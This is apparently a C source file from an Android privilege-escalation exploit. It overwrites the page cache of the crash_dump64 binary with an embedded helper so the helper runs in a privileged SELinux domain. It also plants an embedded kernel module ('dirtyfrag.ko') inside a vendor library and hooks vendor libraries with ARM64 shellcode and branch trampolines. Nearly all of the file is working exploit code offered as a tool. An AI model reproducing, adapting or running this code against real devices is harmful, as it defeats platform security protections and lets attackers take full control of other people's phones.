#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "exploit.h"

static char *libcxx_ko_target;
static uint8_t *libcxx_soft_reboot;

void stages_configure(const char *ko_target, int soft_reboot) {
    extern char libcxx_data[];
    extern uint32_t libcxx_ko_target_off, libcxx_soft_reboot_off;
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';
    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
    *libcxx_soft_reboot = soft_reboot ? 1 : 0;
}

/* Device-specific payloads embedded in the shared library. */
extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;
extern uint32_t libcxx_soft_reboot_off;

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     struct Reporter *reporter);

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_start\n.global dirtyfrag_ko_end\n"
    "dirtyfrag_ko_start:\n.incbin \"dirtyfrag.ko\"\ndirtyfrag_ko_end:\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dirtyfrag_ko_start[], dirtyfrag_ko_end[];
extern char splice_helper_start[], splice_helper_end[];

/* Pad payload to a multiple of 16 bytes in a heap buffer.
 * Caller must free() the returned pointer.
 */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}


int patch_ko(struct Reporter *reporter) {
    REPORTLN("* dirtyfrag.ko (%d bytes)",
             (int)(dirtyfrag_ko_end - dirtyfrag_ko_start));

    /* patch #1: write splicehelper into crash_dump64 page cache.
     * After this, exec'ing CRASH_DUMP_PATH runs our splicehelper in crash_dump
     * SELinux domain (exec transition on the path label) and can open vendor files. */
    size_t sh_len_padded;
    char *sh_buf = pad16(splice_helper_start,
                         (size_t)(splice_helper_end - splice_helper_start),
                         &sh_len_padded);
    if (!sh_buf) return -1;
    REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
    int ret = patch_file_cbc(CRASH_DUMP_PATH, sh_buf, sh_len_padded, 0, 0, reporter);
    free(sh_buf);
    if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }

    size_t ko_len_padded;
    char *ko_buf = pad16(dirtyfrag_ko_start,
                         (size_t)(dirtyfrag_ko_end - dirtyfrag_ko_start),
                         &ko_len_padded);
    if (!ko_buf) return -1;

    /* patch #2: write KO into vendor lib via crash_dump bridge */
    REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
    free(ko_buf);
    if (ret) REPORTLN("patch #2 failed: %d", ret);
    return ret;
}

int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy,
                      struct Reporter *reporter, struct PatchRestore *restore) {
    uint64_t hook_off, shell_off; uint32_t first_insn;
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, reporter)) {
        REPORTLN("find %s hook target failed", lib); return 1;
    }
    REPORTLN("%s hook=0x%lx shell=0x%lx len=%u", lib, hook_off, shell_off, stage_len);

    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        REPORTLN("%s already hooked", lib); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
    *(uint32_t *)&first_inst_copy[0] = first_insn;

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) return -1;

    if (restore) {
        restore->lib = lib;
        restore->shell_off = shell_off;
        restore->shell_padded = padded;
        restore->shell_orig = malloc(padded);
        if (restore->shell_orig) {
            int rfd = open(lib, O_RDONLY);
            if (rfd < 0 || pread(rfd, restore->shell_orig, padded, (off_t)shell_off) != (ssize_t)padded) {
                free(restore->shell_orig); restore->shell_orig = NULL;
            }
            if (rfd >= 0) close(rfd);
        }
    }

    REPORTLN("* patching %s shellcode", lib);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
    free(buf);
    if (ret) { REPORTLN("* patching %s shellcode failed", lib); return ret; }

    {
        uint64_t aligned = hook_off & ~(uint64_t)15;
        int pos = (int)(hook_off & 15);
        uint8_t blk[16];
        int fd = open(lib, O_RDONLY);
        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
            REPORTLN("pread %s trampoline block failed", lib); if (fd >= 0) close(fd); return -1;
        }
        close(fd);
        if (restore) {
            restore->tramp_aligned = aligned;
            memcpy(restore->tramp_orig, blk, 16);
            restore->valid = 1;
        }
        blk[pos+0] = (uint8_t)(hook_insn      );
        blk[pos+1] = (uint8_t)(hook_insn >>  8);
        blk[pos+2] = (uint8_t)(hook_insn >> 16);
        blk[pos+3] = (uint8_t)(hook_insn >> 24);
        REPORTLN("* patching %s trampoline at 0x%lx", lib, hook_off);
        ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
    }
    return ret;
}

void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
    if (!r->valid) return;
    REPORTLN("* restore trampoline in %s", r->lib);
    patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
    if (r->shell_orig) {
        REPORTLN("* restore shellcode in %s", r->lib);
        patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
    }
}

void fadvise_drop(const char *path, struct Reporter *reporter) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { REPORTLN("fadvise_drop open %s failed: %s", path, strerror(errno)); return; }
    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
    close(fd);
    REPORTLN("* cache dropped: %s", path);
}

int create_orphan_process(struct Reporter *reporter) {
    int pid = fork();
    if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { usleep(50000); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

int has_marker(const char *p) { return access(p, F_OK) == 0; }
